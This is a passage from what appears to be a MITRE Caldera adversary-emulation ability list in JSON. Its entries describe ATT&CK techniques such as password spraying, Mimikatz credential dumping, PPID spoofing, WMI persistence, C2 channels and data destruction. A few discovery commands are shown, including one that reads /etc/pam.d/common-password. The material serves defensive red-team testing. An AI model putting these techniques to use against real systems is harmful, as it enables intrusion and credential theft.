        "name": "Netsh Helper DLL Registration",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7ca3ddd55eb462f0bea2e31a88773ddc",
        "technique_id": "T1546.007",
        "repeatable": false
    },
    {
        "description": "View network configuration info for host",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sudo ifconfig",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Network Interface Configuration",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "e8017c46-acb8-400c-a4b5-b3362b5b5baa",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Scans the local network for common open ports",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Scanning",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Network Service Scanning",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "5a4cb2be-2684-4801-9355-3a90c91e0004",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Network Share Discovery PowerShell",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "25b475e94dd2d70fcc66b2ce43c8f718",
        "technique_id": "T1135",
        "repeatable": false
    },
    {
        "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Network Share Discovery command prompt",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "743517fa2f3b55455ac00bf5278dfb67",
        "technique_id": "T1135",
        "repeatable": false
    },
    {
        "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Application Shimming",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "New shim database files created in the default shim database directory",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "3571488e9343065a62e25f45fe8848f0",
        "technique_id": "T1546.011",
        "repeatable": false
    },
    {
        "description": "Use nimgrab.exe to download a file from the web. \n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Nimgrab - Transfer Files",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "5897806f5beb75a30356063c17f58f49",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "OSTAP JS version",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "cde814c61dcd8b0fbeeb14f005c2432f",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "OSTAP Worming Activity",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "148563e9c9fb2aaf64c617b2302d4c56",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Uses cscript //E:jscript to download a file\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "OSTap Payload Download",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "373d28654268ba4613372df3904eb11f",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "OSTap Style Macro Execution",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "431121fe12b6fd82938a9a52526b3423",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Obfuscated Command in PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ed172018f897dab90147a47995ce197d",
        "technique_id": "T1027",
        "repeatable": false
    },
    {
        "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Obfuscation Tests",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "ef943918da20ee40d378ad000bbcc3b7",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "This test simulates an adversary Octopus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n",
        "buckets": [
            "initial-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Supply Chain Compromise",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Octopus Scanner Malware Open Source Supply Chain",
        "tactic": "initial-access",
        "plugin": "atomic",
        "ability_id": "4f0c66956fc56e1ab11f4a1e394a4fd0",
        "technique_id": "T1195",
        "repeatable": false
    },
    {
        "description": "Execute arbitrary DLL file stored locally.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Odbcconf",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Odbcconf.exe - Execute Arbitrary DLL",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f6f3109375020c484e291ac3668f38af",
        "technique_id": "T1218.008",
        "repeatable": false
    },
    {
        "description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Odbcconf",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Odbcconf.exe - Load Response File",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2fae8daf5c8d30455c0055c26248c661",
        "technique_id": "T1218.008",
        "repeatable": false
    },
    {
        "description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Office Application Startup",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Office Application Startup - Outlook as a C2",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "12ad9edefc86af07700fbf49bfdac6ba",
        "technique_id": "T1137",
        "repeatable": false
    },
    {
        "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Office Generic Payload Download",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "ca3c058554276f34ac84b996af0caf0d",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Office launching .bat file from AppData",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "705c4b9714ce06223e7d7038cd332808",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Offline Credential Theft With Mimikatz",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "2b20abe4020074cc3598e28dcf41d1bc",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "This test will attempt to open a local port defined by input arguments to any profile",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Open a local port through Windows Firewall to any profile",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "9378f5d52c7f94cd08f407f8c0a5fbd7",
        "technique_id": "T1562.004",
        "repeatable": false
    },
    {
        "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Encrypted Channel",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "OpenSSL C2",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "fb827394b296192cb7a81031a2e37ae2",
        "technique_id": "T1573",
        "repeatable": false
    },
    {
        "description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Opening ports for proxy - HARDRAIN",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "bd5ee87126c38b409c12f823ec4469c2",
        "technique_id": "T1562.004",
        "repeatable": false
    },
    {
        "description": "RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.\nThis process is very slow and test execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Destruction",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Overwrite deleted data on C drive",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "66f19707907a88df172057c131ae2168",
        "technique_id": "T1485",
        "repeatable": false
    },
    {
        "description": "An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Deployment Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PDQ Deploy RAT",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "41d1aa5e9ab0eb27bf8f9fb0f43ac0ab",
        "technique_id": "T1072",
        "repeatable": false
    },
    {
        "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Sniffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Packet Capture Windows Command Prompt",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "2125c8629020f136ed11d2124dc76d2c",
        "technique_id": "T1040",
        "repeatable": false
    },
    {
        "description": "Spawns a powershell.exe process as a child of the current process.",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: Parent PID Spoofing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Parent PID Spoofing - Spawn from Current Process",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d0966749d457cb6218a8cd5ee5128ea2",
        "technique_id": "T1134.004",
        "repeatable": false
    },
    {
        "description": "Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: Parent PID Spoofing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Parent PID Spoofing - Spawn from New Process",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "4e9bac619326378b219b3635c9a91b94",
        "technique_id": "T1134.004",
        "repeatable": false
    },
    {
        "description": "Spawns a notepad.exe process as a child of the current process.",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: Parent PID Spoofing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Parent PID Spoofing - Spawn from Specified Process",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "9ac97b0e88af420a8c767a7512985895",
        "technique_id": "T1134.004",
        "repeatable": false
    },
    {
        "description": "Spawnd a process as a child of the first accessible svchost.exe process.",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: Parent PID Spoofing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Parent PID Spoofing - Spawn from svchost.exe",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "aa40e8fe704a97fb7f7a5a02e9334824",
        "technique_id": "T1134.004",
        "repeatable": false
    },
    {
        "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: Parent PID Spoofing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Parent PID Spoofing using PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "434e3cfb32590973acfc2cad9c3b523a",
        "technique_id": "T1134.004",
        "repeatable": false
    },
    {
        "description": "Bruteforce a single user's password from a wordlist\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Guessing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Password Brute User using Kerbrute Tool",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "dcf01b96aca3771f0afc86357cbe5c6d",
        "technique_id": "T1110.001",
        "repeatable": false
    },
    {
        "description": "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Manipulation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Password Change on Directory Service Restore Mode (DSRM) Account",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "9de217b5623080a6bc898c636b1e599d",
        "technique_id": "T1098",
        "repeatable": false
    },
    {
        "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Cracking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Password Cracking with Hashcat",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "16d35ea694e0568c1fee03936e448865",
        "technique_id": "T1110.002",
        "repeatable": false
    },
    {
        "description": "Password Policy Discovery",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Password Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cat /etc/pam.d/common-password",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Password Policy",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a",
        "technique_id": "T1201",
        "repeatable": false
    },
    {
        "description": "Password Policy Discovery for a domain",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Password Policy Discovery for a domain",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Password Policy for a domain",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "2946edba-54d8-11eb-ae93-0242ac130002",
        "technique_id": "T1201",
        "repeatable": false
    },
    {
        "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Spraying",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Password Spray (DomainPasswordSpray)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "c285cfeaf0c226d3d2b3812726dbe3a8",
        "technique_id": "T1110.003",
        "repeatable": false
    },
    {
        "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Spraying",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Password Spray Invoke-DomainPasswordSpray Light",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "279d24eeb12b40e4547945accf59ca62",
        "technique_id": "T1110.003",
        "repeatable": false
    },
    {
        "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Spraying",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Password Spray all Domain Users",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "4f3f0cbca49ee581e3296d16f559c725",
        "technique_id": "T1110.003",
        "repeatable": false
    },
    {
        "description": "Test a single password against a list of users\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Spraying",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Password Spray using Kerbrute Tool",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "749175da6f9c4fc4609df39c8f98fca2",
        "technique_id": "T1110.003",
        "repeatable": false
    },
    {
        "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Spraying",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "a59dbd1a2ac17d69455248e7d91231bc",
        "technique_id": "T1110.003",
        "repeatable": false
    },
    {
        "description": "Summary of permission and security groups",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Local Groups",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "groups",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Permission Groups Discovery",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2",
        "technique_id": "T1069.001",
        "repeatable": false
    },
    {
        "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Permission Groups Discovery PowerShell (Domain)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "72089a2bd4a6a6f792f996d39e6b9366",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Local Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Permission Groups Discovery PowerShell (Local)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f5b4c02bae169cb3a62ac26bb80321d6",
        "technique_id": "T1069.001",
        "repeatable": false
    },
    {
        "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "BITS Jobs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Persist, Download, & Execute",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5f939e65285f8e67507359887d2109a2",
        "technique_id": "T1197",
        "repeatable": false
    },
    {
        "description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Login Items",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Persistence by modifying Windows Terminal profile",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "01a2ad691dfb47b11d050fab371718d2",
        "technique_id": "T1547.015",
        "repeatable": false
    },
    {
        "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Persistence via WMI Event Subscription - ActiveScriptEventConsumer",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "4df4fdb269f34dd6d55969c83ff06c73",
        "technique_id": "T1546.003",
        "repeatable": false
    },
    {
        "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Persistence via WMI Event Subscription - CommandLineEventConsumer",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "938a659c52ed102a8b35c7b1bb49eb11",
        "technique_id": "T1546.003",
        "repeatable": false
    },
    {
        "description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Persistence with Custom AutodialDLL",
        "tactic": "multiple",
        "plugin": "atomic",
